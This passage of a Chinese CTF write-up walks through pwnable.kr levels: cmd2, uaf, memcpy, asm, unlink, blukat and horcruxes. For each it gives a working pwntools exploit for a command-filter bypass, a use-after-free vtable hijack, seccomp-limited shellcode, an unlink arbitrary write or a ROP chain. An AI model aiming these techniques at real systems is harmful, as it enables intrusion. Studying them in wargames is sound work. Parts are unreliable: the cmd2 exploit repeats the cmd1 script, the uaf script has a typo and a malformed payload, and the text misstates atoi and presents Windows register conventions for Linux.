但是可以绝对引用啊，然后cat是支持通配符的，就可以绕过了

Exp:

```python
#coding=utf-8
from pwn import *

shell=ssh(host='pwnable.kr',user='cmd1',password='guest',port=2222)
#shell.download_file('./cmd1.c')
sh = shell.run('./cmd1 "/bin/cat fl*" ')
sh.interactive()
```

## 0x0F cmd2

算是cmd1的进阶版本

```python
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}

```

这次连斜杠都给过滤了。。。

但是 bash里可以用 $()取值

比如我们cd 到根目录

$(pwd)就相当于斜杠了

然后就可以绕过了

还有一个坑点是

不能用“”包裹参数了

因为如下

bash里面关于单引号，双引号，反斜杠的处理

字符 | 说明
:-: | :-: 
’(单引号)|又叫硬转义，其内部所有的shell 元字符、通配符都会被关掉。注意，硬转义中不允许出现’(单引号)
“”(双引号)|	又叫软转义，其内部只允许出现特定的shell 元字符：$用于参数代换 `用于命令代替
\\(反斜杠)	|又叫转义，去除其后紧跟的元字符或通配符的特殊意义。

Exp:

```python
#coding=utf-8
from pwn import *

shell=ssh(host='pwnable.kr',user='cmd1',password='guest',port=2222)
#shell.download_file('./cmd1.c')
sh = shell.run('./cmd1 "/bin/cat fl*" ')
sh.interactive()
```

## 0x10 uaf

### 前置知识：类重载·虚函数

```
在cpp中，如果类中有虚函数，那么它就会有一个虚函数表的指针__vfptr，在类对象最开始的内存数据中。之后是类中的成员变量的内存数据。

对于子类，最开始的内存数据记录着父类对象的拷贝（包括父类虚函数表指针和成员变量）。 之后是子类自己的成员变量数据。

如果一个类中有虚函数，那么就会建立一张虚函数表vtable，子类继承父类vtable，若，父类的vtable中私有(private)虚函数,则子类vtable中同样有该私有(private)虚函数的地址。注意这并不是直接继承了私有(private)虚函数

当子类重载父类虚函数时，修改vtable同名函数地址，改为指向子类的函数地址，若子类中有新的虚函数，在vtable尾部添加。

vptr每个对象都会有一个，而vptable是每个类有一个，vptr指向vtable，一个类中就算有多个虚函数，也只有一个vptr；做多重继承的时候，继承了多个父类，就会有多个vptr

作者：看雪学院
链接：https://www.jianshu.com/p/a66adda1d0be
来源：简书
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。
```

![img](/assets/images/vtable-1.jpg)

**单一继承，无虚函数重载**

![img](/assets/images/vtable-2.jpg)

**单一继承，重载了虚函数**

![img](/assets/images/vtable-3.jpg)


所以在本题中，我们可以通过修改Man类重载的虚函数地址指向从Human拷贝过来的give_shell函数

```bash
gdb-peda$ file uaf
Reading symbols from uaf...(no debugging symbols found)...done.
gdb-peda$ b *0x0000000000400F13 #new man的函数地址 在ida 中可看到
Breakpoint 1 at 0x400f13 
gdb-peda$ r 
Starting program: /root/codes/pwnable.kr/uaf
[----------------------------------registers-----------------------------------]
RAX: 0x614ea0 --> 0x0
RBX: 0x614ea0 --> 0x0
RCX: 0x614eb0 --> 0x0
RDX: 0x19
RSI: 0x7ffffffee180
RDI: 0x614ea0 --> 0x0
RBP: 0x7ffffffee1d0
RSP: 0x7ffffffee170
RIP: 0x400f13 --> 0x5d89480000034ce8
R8 : 0x614ea0 --> 0x0
R9 : 0x7fffff78afc0 --> 0x602210 --> 0x7fffff6649e0 (<_ZN10__cxxabiv117__class_type_infoD2Ev>:            )R10: 0x20 (' ')
R11: 0x0
R12: 0x7ffffffee180
R13: 0x7ffffffee2b0
R14: 0x0
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400f08 <main+68>:  mov    edx,0x19
   0x400f0d <main+73>:  mov    rsi,r12
   0x400f10 <main+76>:  mov    rdi,rbx
=> 0x400f13 <main+79>:  call   0x401264 <_ZN3ManC2ESsi>
   0x400f18 <main+84>:  mov    QWORD PTR [rbp-0x38],rbx
   0x400f1c <main+88>:  lea    rax,[rbp-0x50]
   0x400f20 <main+92>:  mov    rdi,rax
   0x400f23 <main+95>:  call   0x400d00 <_ZNSsD1Ev@plt>
Guessed arguments:
arg[0]: 0x614ea0 --> 0x0
arg[1]: 0x7ffffffee180
arg[2]: 0x19
[------------------------------------stack-------------------------------------]
Invalid $SP address: 0x7ffffffee170
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400f13 in main ()
gdb-peda$ ni #执行一行源程序代码（汇编级别），此行代码中的函数调用也一并执行。
[----------------------------------registers-----------------------------------]
RAX: 0x614ea0 --> 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>:     push   rbp)
RBX: 0x614ea0 --> 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>:     push   rbp)
RCX: 0x614eb0 --> 0x614e88 --> 0x6b63614a ('Jack')
RDX: 0x19
RSI: 0x7ffffffee180
RDI: 0x7fffff7982e0 --> 0x0
RBP: 0x7ffffffee1d0
RSP: 0x7ffffffee170
RIP: 0x400f18 --> 0xb0458d48c85d8948
R8 : 0x614ea0 --> 0x401570 --> 0x40117a (<_ZN5Human10give_shellEv>:     push   rbp)
R9 : 0x7fffff78afc0 --> 0x602210 --> 0x7fffff6649e0 (<_ZN10__cxxabiv117__class_type_infoD2Ev>:            )R10: 0x7fffff5f909d ("_ZNSs6assignERKSs")
R11: 0x7fffff6a72c0 (<_ZNSs6assignERKSs>:       push   r12)
R12: 0x7ffffffee180
R13: 0x7ffffffee2b0
R14: 0x0
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400f0d <main+73>:  mov    rsi,r12
   0x400f10 <main+76>:  mov    rdi,rbx
   0x400f13 <main+79>:  call   0x401264 <_ZN3ManC2ESsi>
=> 0x400f18 <main+84>:  mov    QWORD PTR [rbp-0x38],rbx
   0x400f1c <main+88>:  lea    rax,[rbp-0x50]
   0x400f20 <main+92>:  mov    rdi,rax
   0x400f23 <main+95>:  call   0x400d00 <_ZNSsD1Ev@plt>
   0x400f28 <main+100>: lea    rax,[rbp-0x12]
[------------------------------------stack-------------------------------------]
Invalid $SP address: 0x7ffffffee170
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000400f18 in main ()
gdb-peda$ p /x $rbx #查看实例化的Man对象地址
$1 = 0x614ea0
gdb-peda$ x /10w 0x614ea0 #查看实例化的Man内存空间 虚表指针在首部 即 0x00401570
0x614ea0:       0x00401570      0x00000000      0x00000019      0x00000000
0x614eb0:       0x00614e88      0x00000000      0x0000f151      0x00000000
0x614ec0:       0x00000000      0x00000000
gdb-peda$ x /10 0x00401570 #查看虚表 结合ida 可发现 0x0040117a 存放的是 give_shell的函数地址 0x004012d2 存放的是man::introduce的函数地址
0x401570 <_ZTV3Man+16>: 0x0040117a      0x00000000      0x004012d2      0x00000000
0x401580 <_ZTV5Human>:  0x00000000      0x00000000      0x004015f0      0x00000000
0x401590 <_ZTV5Human+16>:       0x0040117a      0x00000000
```

### Use-After-Free

> 当所指向的对象被释放或者收回，但是对该指针没有作任何的修改，以至于该指针仍旧指向已经回收的内存地址，此情况下该指针便称迷途指针。若操作系统将这部分已经释放的内存重新分配给另外一个进程，而原来的程序重新引用现在的迷途指针，则将产生无法预料的后果

具体过程如下图

![img](/assets/images/uaf.jpg)

### 分析源码

```cpp
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}
```

根据uaf的原理，我们只需要先free 然后再利用after修改Dangling pointer指向的内存，然后再use一下就行，这里我们通过修改虚表指针，来利用源码中的后门give_shell()

```python
#coding=utf-8
from pwn import *

shell=ssh(host='pwnable.kr',user='uaf',password='guest',port=2222)

#shell.download_file("./uaf.cpp")
#shell.download_file("./uaf")

v_ptr=0x00401570

payload=v_ptr-0x8 #修改虚表指针

sh=shell.run('sh')
sh.sendline('python -c "print" '+p64(payload)+'> /tmp/exp.txt')
sh.sendline("./uaf 24 /tmp/exp.txt")#Man 对象分配的堆空间是24个字节
sh.sendline("3")
sh.sendline("2")#因为先free m再free w，所以为了再次拿到m所指向的空间，我们需要分配两次，第一次得到w所指向的空间，第二次才再次得到m所指向的空间
sh.sendline("2")
sh.sendlune("1")
sh.interactive()
```

### 参考资料

https://www.jianshu.com/p/a66adda1d0be

[https://zh.wikipedia.org/wiki/%E8%BF%B7%E9%80%94%E6%8C%87%E9%92%88](https://zh.wikipedia.org/wiki/迷途指针)

## 0x11 memcpy

看源码觉得，真的就随便输一下执行完实验就好了？

但是随便输值得话会crash....

问题出在 movntps 这条汇编指令上

> Moves the packed double-precision floating-point values in the source operand (second operand) to the destination operand (first operand) using a non-temporal hint to prevent caching of the data during the write to memory. The source operand is an XMM register, YMM register or ZMM register, which is assumed to contain packed double-precision, floating-pointing data. The destination operand is a 128-bit, 256-bit or 512-bit memory location. **The memory operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary otherwise a general-protection exception (#GP) will be generated.**

要求16位对齐

观察malloc过程

> malloc在分配内存时它实际上还会多分配4字节用于存储堆块信息，所以如果分配a字节实际上分配的是a+4字节。另外32位系统上该函数分配的内存是以8字节对齐的。

有了这两点就知道程序的异常退出是因为分配的内存没有16字节对齐，那么要让程序正常进行拿到flag只需要每次分配的内存地址能够被16整除就可以了。

（实际上由于malloc函数分配的内存8字节对齐，只要内存大小除以16的余数大于9就可以了）。

**Exp**

```python
#coding=utf-8
from pwn import *
context.log_level = 'DEBUG'

shell = ssh(host="pwnable.kr",user="memcpy",port=2222,password="guest")
io = shell.connect_remote("0.0.0.0",9022)
#io=process("./memcpy")
io.recvuntil("specify the memcpy amount between 8 ~ 16 :")
io.sendline('8')
for i in range(9):
    payload = str(pow(2, i+4)+10)
    io.sendlineafter(': ', payload)
io.interactive()
```



## 0x12 shellcode

stub中的内容

```
python
>>> from pwn import *
>>> print disasm("\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff")
   0:   48                      dec    eax
   1:   31 c0                   xor    eax, eax
   3:   48                      dec    eax
   4:   31 db                   xor    ebx, ebx
   6:   48                      dec    eax
   7:   31 c9                   xor    ecx, ecx
   9:   48                      dec    eax
   a:   31 d2                   xor    edx, edx
   c:   48                      dec    eax
   d:   31 f6                   xor    esi, esi
   f:   48                      dec    eax
  10:   31 ff                   xor    edi, edi
  12:   48                      dec    eax
  13:   31 ed                   xor    ebp, ebp
  15:   4d                      dec    ebp
  16:   31 c0                   xor    eax, eax
  18:   4d                      dec    ebp
  19:   31 c9                   xor    ecx, ecx
  1b:   4d                      dec    ebp
  1c:   31 d2                   xor    edx, edx
  1e:   4d                      dec    ebp
  1f:   31 db                   xor    ebx, ebx
  21:   4d                      dec    ebp
  22:   31 e4                   xor    esp, esp
  24:   4d                      dec    ebp
  25:   31 ed                   xor    ebp, ebp
  27:   4d                      dec    ebp
  28:   31 f6                   xor    esi, esi
  2a:   4d                      dec    ebp
  2b:   31 ff                   xor    edi, edi
```

将所有寄存器清零

对我们写shellcode看起来没有啥影响

注意到源码对可用的指令做了限制

```
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
```

只能使用这些指令。。。

可以利用pwntool的shellcraft来快速编写shellcode

**Exp**

```python
#coding=utf-8
from pwn import *
context(arch="amd64",os="Linux",log_level="DEBUG")

shell = ssh(host="pwnable.kr",user="asm",port=2222,password="guest")
#shell.download_file("./asm.c")

io = shell.connect_remote("0.0.0.0",9026)
filename="this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
shellcode=""
shellcode+=shellcraft.open(filename)#打开文件到 rax(返回值)
shellcode+=shellcraft.read('rax','rsp',100)#读文件 100个字节 到栈上 (rsp)
shellcode+=shellcraft.write(1,'rsp',100)#从rsp 写到stdout=1 (stdin=0) 
print shellcode
io.sendafter("give me your x64 shellcode:",asm(shellcode))
io.interactive()
```

附一张x64各寄存器用途

| Register       | 状态         | 请使用                                                     |
| -------------- | ------------ | ---------------------------------------------------------- |
| **RAX**        | **易失的**   | **返回值寄存器**                                           |
| **RCX**        | **易失的**   | **第一个整型参数**                                         |
| **RDX**        | **易失的**   | **第二个整型参数**                                         |
| **R8**         | **易失的**   | **第三个整型参数**                                         |
| **R9**         | **易失的**   | **第四个整型参数**                                         |
| **R10:R11**    | **易失的**   | **必须根据需要由调用方保留；在 syscall/sysret 指令中使用** |
| **R12:R15**    | **非易失的** | **必须由被调用方保留**                                     |
| **RDI**        | **非易失的** | **必须由被调用方保留**                                     |
| **RSI**        | **非易失的** | **必须由被调用方保留**                                     |
| **RBX**        | **非易失的** | **必须由被调用方保留**                                     |
| **RBP**        | **非易失的** | **可用作帧指针；必须由被调用方保留**                       |
| **RSP**        | **非易失的** | **堆栈指针**                                               |
| **XMM0**       | **易失的**   | **第一个 FP 参数**                                         |
| **XMM1**       | **易失的**   | **第二个 FP 参数**                                         |
| **XMM2**       | **易失的**   | **第三个 FP 参数**                                         |
| **XMM3**       | **易失的**   | **第四个 FP 参数**                                         |
| **XMM4:XMM5**  | **易失的**   | **必须根据需要由调用方保留**                               |
| **XMM6:XMM15** | **非易失的** | **必须根据需要由被调用方保留。**                           |

## 0x13 unlink

考察堆溢出和DWORD SHOOT操作

### 前置知识 DWORD SHOOT

![卸载结点的过程图](/assets/images/remove_node.jpg)

unlink正常情况下的操作示意图

```c
void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;//如果bk已经被恶意覆盖了呢 比如一个4字节的恶意数据
	FD=P->fd;//如果fd已经被恶意覆盖了呢 比如一个内存地址
	FD->bk=BK;//那么FD指向的地址的bk会被BK的恶意数据覆盖
	BK->fd=FD;
}
```



![DWORD SHOOT发生的原理](/assets/images/dword_shoot.jpg)





既然我们已经拿到shell后门的地址了，不难想到可以通过 FD->bk=BK 将 shell 函数的起始地址写到返回地址上

```c
void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;//bk是shell的地址
	FD=P->fd;
	FD->bk=BK;//那么FD指向的地址的bk会被BK的恶意数据覆盖
	BK->fd=FD;//但是BK(shell)的内容会在此处被覆盖
}
```

如果是利用堆溢出指向堆上的一段shellcode

checksec发现程序有NX保护。。。。

看大佬的wp找到一点思路

在汇编代码的最后一段

```assembly
.text:080485FF                 mov     ecx, [ebp+var_4]
.text:08048602                 leave
.text:08048603                 lea     esp, [ecx-4]
.text:08048606                 retn
```

>retn指令相当于**pop eip**，该指令是可以控制程序运行流程的，流程的来源是esp指向的地址。
>
>而再之前 lea esp，[ecx-4]即把ecx-4地址中的数据赋给esp。
>
>而在此逆推ecx的值是从mov ecx,[ebp-4]中得到的。
>
>而leave指令相当于mov esp ebp，pop ebp，对esp数据的来源无影响。
>
>ebp在整个main函数运行中是不变的。
>
>因此，可以构造 [ecx-4] = shell的起始地址
>
>这样 就可以先把 shell的起始地址写到一个内存地址（如可以在A->buf的起始部分输入shell函数地址），ecx再指向该地址+4.
>
>进一步就是将ebp-4地址中的值覆写成上面的地址+4.

大致就是利用unlink对地址[ecx-4]进行任意写（shell）

然后retn的时候利用

A,B,C在栈上的位置可从ida中看出

```c
A // [esp+4h] [ebp-14h]
B // [esp+Ch] [ebp-Ch]
C // [esp+8h] [ebp-10h]
```

ebp可以从汇编代码中算出

```asm
.text:08048555                 call    _malloc
.text:0804855A                 add     esp, 10h
.text:0804855D                 mov     [ebp+var_14], eax
```

结合反汇编得到的代码可以得到

ebp-0x14=&A=stack_addr

这样如何解决之前的覆盖问题呢

一种方法是

当BK = ebp-4时，FD + 4 = shell +4 ，FD = shell,  覆写时，[shell+4] = ebp-4

```c
void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;//bk是[ebp-4]=[ebp-4] 也即 stack_addr+0x14-0x4
	FD=P->fd;//fd指向ecx=(shell_addr+4) 也即 (heap_addr+0x8)+0x4
	FD->bk=BK;//此时FD->bk=ecx+4 无影响
	BK->fd=FD;//此时BK->fd=ecx=(shell_addr+4)
}
```

### Exp

```python
#coding=utf-8
from pwn import *
context(arch='amd64',os='linux',log_level="DEBUG")

shell=ssh(host='pwnable.kr',user='unlink',password='guest',port=2222)

#shell.download_file("./unlink.c")
#shell.download_file("./unlink")

io=shell.run("./unlink")

shell_addr=0x080484EB

re=io.recvline()
stack_addr=int(re.split(":")[1],16) # &A
re=io.recvline()
heap_addr=int(re.split(":")[1],16) # A
io.recvline()

'''
typedef struct tagOBJ{
	struct tagOBJ* fd;//4 byte
	struct tagOBJ* bk;//4 byte
	char buf[8];//8 byte
}OBJ;
'''

payload = p32(shell_addr)#(A->buf(0~3))
payload +="a"*(0x4+0x8)#(A->buf(4~7)+padding(0x08))
payload += p32(heap_addr+0x8+0x4)#(B->fd)
payload += p32(stack_addr+0x14-0x4)#(B->bk)

#print hex(stack_addr)+" "+hex(heap_addr)

io.send(payload)
io.interactive()
```



### 参考资料：

https://bbs.pediy.com/thread-247883.htm

[https://introspelliam.github.io/2017/06/26/0day/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%8A%EF%BC%89%E2%80%94%E2%80%94DWORD-SHOOT/](https://introspelliam.github.io/2017/06/26/0day/堆溢出利用（上）——DWORD-SHOOT/)

https://www.cnblogs.com/p4nda/p/7172104.html

https://blog.csdn.net/Apollon_krj/article/details/51302859

## 0x14 blukat

好绝一题

分析源码发现没有溢出点，难道真的只能爆破password?

然后ls -al 看了一下

```
blukat@prowl:~$ ls -al
total 36
drwxr-x---   4 root blukat     4096 Aug 16  2018 .
drwxr-xr-x 116 root root       4096 Nov 12 21:34 ..
-r-xr-sr-x   1 root blukat_pwn 9144 Aug  8  2018 blukat
-rw-r--r--   1 root root        645 Aug  8  2018 blukat.c
dr-xr-xr-x   2 root root       4096 Aug 16  2018 .irssi
-rw-r-----   1 root blukat_pwn   33 Jan  6  2017 password
drwxr-xr-x   2 root root       4096 Aug 16  2018 .pwntools-cache
```

可以看到 password是可读的。。。。。

但是这个回显导致一开始根本没去想。。。。

```bash
blukat@prowl:~$ cat password
cat: password: Permission denied #一般是权限不足的正常回显。。。。
```

后来发现password是可以scp下下来的，也就是说password里面就是这个字符串。。。。

输入即可

**Exp**

```
#coding=utf-8
from pwn import *
context(arch="amd64",os="Linux",log_level="DEBUG")

shell = ssh(host="pwnable.kr",user="blukat",port=2222,password="guest")

shell.download_file("./password")

io=shell.run("./blukat")

io.sendlineafter("guess the password!","cat: password: Permission denied")
io.interactive()
```

## 0x15 horcruxes

逆向后核心源码

```cpp
int ropme()
{
  char s[100]; // [esp+4h] [ebp-74h]
  int v2; // [esp+68h] [ebp-10h]
  int fd; // [esp+6Ch] [ebp-Ch]

  printf("Select Menu:");
  __isoc99_scanf("%d", &v2);
  getchar();
  if ( v2 == a ) A();
  else if ( v2 == b ) B();
  else if ( v2 == c ) C();
  else if ( v2 == d ) D();
  else if ( v2 == e ) E();
  else if ( v2 == f ) F();
  else if ( v2 == g ) G();
  else
  {
    printf("How many EXP did you earned? : ");
    gets(s);//存在栈溢出
    if ( atoi(s) == sum )
    {
      fd = open("flag", 0);
      s[read(fd, s, 0x64u)] = 0;
      puts(s);
      close(fd);
      exit(0);
    }
    puts("You'd better get more experience to kill Voldemort");
  }
  return 0;
}
```

题目思路是拿到a,b,c,d,e,f,g的值，来得到flag

a,b,c,d,e,f,g随机

直接绕过判断是不行的，main里的seccomp把可绕过的地址都封死了

还是利用gets栈溢出，去调用A,B,C,D,E,F,G的函数来得到对应值，然后再跳回来输入对应的EXP

**Exp**

```python
#coding=utf-8
from pwn import *
context(arch="amd64",os="Linux",log_level="DEBUG")

shell = ssh(host="pwnable.kr",user="horcruxes",port=2222,password="guest")

#shell.download_file("./horcruxes")

io=shell.connect_remote("0.0.0.0",9032)

payload="1"
#io.sendlineafter("guess the password!","cat: password: Permission denied")
io.recv()
io.sendline(payload)

a_addr=0x0809FE4B
b_addr=0x0809FE6A
c_addr=0x0809FE89
d_addr=0x0809FEA8
e_addr=0x0809FEC7
f_addr=0x0809FEE6
g_addr=0x0809FF05
call_ropme_addr=0x0809FFFC

payload='a'*(0x74+0x4)+p32(a_addr)+p32(b_addr)+p32(c_addr)+p32(d_addr)+p32(e_addr)+p32(f_addr)+p32(g_addr)+p32(call_ropme_addr)
#当函数A()执行结束之后，执行return指令的地址应就是后4个bytes，所以直接将地址罗列在padding数据之后，函数会一个一个的进行跳转

io.sendlineafter("How many EXP did you earned? :",payload)
exp=0
io.recvline()
for i in range(7):
    re = io.recvline()
    u = int(re.strip('\n').split('+')[1][:-1])
    print u
    exp += u
print "Exp: "+str(exp)
io.sendlineafter("Select Menu:","1")
io.sendlineafter("How many EXP did you earned? :",str(exp))
io.interactive()
```

一个坑点是：

ropme的地址是0x080A0009 有个0xA0 相当于换行符 所以会被gets截断，所以绕一步用main里call ropme的地址做替换

另一个坑点是：

atoi函数将int转化为字符串，如果数字超过int范围转化失败返回-1，所以要多试几遍才能出flag.....